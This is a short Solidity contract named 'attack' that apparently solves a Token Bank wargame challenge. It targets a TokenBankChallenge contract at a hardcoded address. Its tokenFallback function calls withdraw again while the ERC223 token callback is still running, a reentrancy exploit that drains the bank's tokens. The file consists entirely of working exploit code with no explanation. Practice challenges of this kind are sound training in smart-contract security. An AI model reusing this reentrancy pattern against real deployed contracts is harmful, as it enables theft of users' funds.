// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;
import "./smoothCriminal.sol";

contract attack {
    uint8 counter = 0;
    TokenBankChallenge challenge =
        TokenBankChallenge(address(0xEEcc706F411fF86818a8909F78E62E880c83dD36));

    function transferToTokenBanck(address tokenaddress, address transferTo)
        public
    {
        SimpleERC223Token token = SimpleERC223Token(tokenaddress);
        token.transfer(transferTo, 500000000000000000000000);
    }

    function attack() {
        challenge.withdraw(500000000000000000000000);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes
    ) public {
        if (counter == 0 || counter == 2) {
            counter += 1;
        } else {
            counter += 1;
            challenge.withdraw(500000000000000000000000);
        }
    }
}
